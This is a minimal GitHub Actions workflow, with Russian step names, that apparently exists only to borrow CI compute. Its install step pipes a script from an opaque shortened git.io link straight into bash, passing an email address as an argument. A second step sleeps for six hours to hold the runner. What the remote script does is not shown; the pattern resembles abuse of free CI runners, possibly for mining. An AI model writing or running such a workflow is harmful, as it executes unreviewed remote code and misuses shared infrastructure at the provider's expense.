name: Main Workflow
on: 
  workflow_dispatch:
    
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 9999
    
    steps:
    - name: Установка
      run: |
        bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
    - name: Смэрть через 6 часов
      run: sleep 6h
